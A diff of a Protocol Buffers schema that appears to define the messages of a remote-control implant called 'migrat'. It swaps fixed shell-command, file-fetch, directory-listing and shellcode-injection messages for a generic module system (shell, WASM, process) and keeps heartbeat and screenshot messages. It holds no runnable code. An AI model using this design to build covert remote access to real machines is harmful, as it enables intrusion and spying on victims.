@@ -3,21 +3,36 @@ package migrat;
 
 option go_package = ".";
 
-message ShellCommand {
-    string command = 1;
-}
-
-message ShellResponse {
-    string output = 1;
-}
-
-message GetFile {
-    string path = 1;
-}
-
-message File {
-    string path = 1;
+message ModuleStart {
+    string name = 1;
     bytes data = 2;
+    repeated string args = 3;
+
+    enum ModuleType {
+        MODULE_SYSTEMSHELL = 0;
+        MODULE_WASM = 1;
+        MODULE_PROCESS = 2;
+    }
+
+    ModuleType type = 4;
+}
+
+message ModuleList {
+    repeated string modules = 1;
+}
+
+message ModuleOutput {
+    string name = 1;
+    string output = 2;
+}
+
+message ModuleInput {
+    string name = 1;
+    string input = 2;
+}
+
+message Error {
+    string message = 1;
 }
 
 message HeartbeatResponse {
@@ -39,35 +54,4 @@ message TakeScreenshot {
 message Screenshot {
     string time = 1;
     bytes data = 2;
-}
-
-message GetDirectory {
-    string path = 1;
-}
-
-message FileInfo {
-    string name = 1;
-    int64 size = 2;
-    bool directory = 3;
-    string owner = 4;
-}
-
-message GetDirectoryResponse {
-    string basepath = 1;
-    repeated FileInfo files = 2;
-}
-
-message Interpret {
-    int32 type = 1;
-    string data = 2;
-}
-
-message InterpretResponse {
-    int32 type = 1;
-    string data = 2;
-}
-
-message InjectShellcode {
-    string target = 1;
-    bytes shellcode = 2;
 }
